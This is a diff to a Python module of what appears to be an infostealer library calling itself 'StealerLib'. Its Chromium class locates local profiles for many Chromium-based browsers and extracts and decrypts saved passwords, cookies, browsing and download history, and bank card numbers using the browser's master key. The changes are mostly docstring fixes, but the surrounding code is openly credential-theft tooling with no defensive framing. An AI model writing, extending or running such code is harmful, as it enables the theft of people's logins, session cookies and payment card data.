@@ -13,7 +13,7 @@ class Chromium:
     """This class provides methods for extracting and decrypting information from Chromium based Web Browser databases
 
     Attributes:
-        appdate     The local filepath for the APPDATA folder
+        appdata     The local filepath for the APPDATA folder
         browsers    A dictionary containing the name and local file path for each popular browser 
         profiles    A list containing the default Chrome Profile names
 
@@ -25,6 +25,8 @@ class Chromium:
     """
 
     def __init__(self): 
+        super(Chromium, self).__init__()
+
         self.appdata = os.getenv('LOCALAPPDATA')
         self.browsers = {
             'amigo': self.appdata + '\\Amigo\\User Data',
@@ -139,7 +141,7 @@ class Chromium:
             self (object): The object passed to the method
             path (str): Chromium browser path to get the passwords from
             profile (str): Chrome profile to use (if available)
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
@@ -183,7 +185,7 @@ class Chromium:
             self (object): The object passed to the method
             path (str): Chromium browser path to get the cookie information from
             profile (str): Chrome profile to use (if available)
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: list of (host, name, path, value, expires?, expire_date) lists (derived from BrowserTypes conv()) 
@@ -227,7 +229,7 @@ class Chromium:
             self (object): The object passed to the method
             path (str): Chromium browser path to get the web history from
             profile (str): Chrome profile to use (if available)
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
@@ -269,7 +271,7 @@ class Chromium:
             self (object): The object passed to the method
             path (str): Chromium browser path to get the download history from
             profile (str): Chrome profile to use (if available)
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
@@ -311,7 +313,7 @@ class Chromium:
             self (object): The object passed to the method
             path (str): Chromium browser path to get the bank cards from from
             profile (str): Chrome profile to use (if available)
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
@@ -332,6 +334,7 @@ class Chromium:
 
             card_number = self.decrypt_password(row[3], self.master_key)
             obj_card = BrowserTypes.Card(row[0], row[1], row[2], card_number, row[4])
+
             self.chromium_banking.append(
                 obj_card.conv() if conv else obj_card
             )
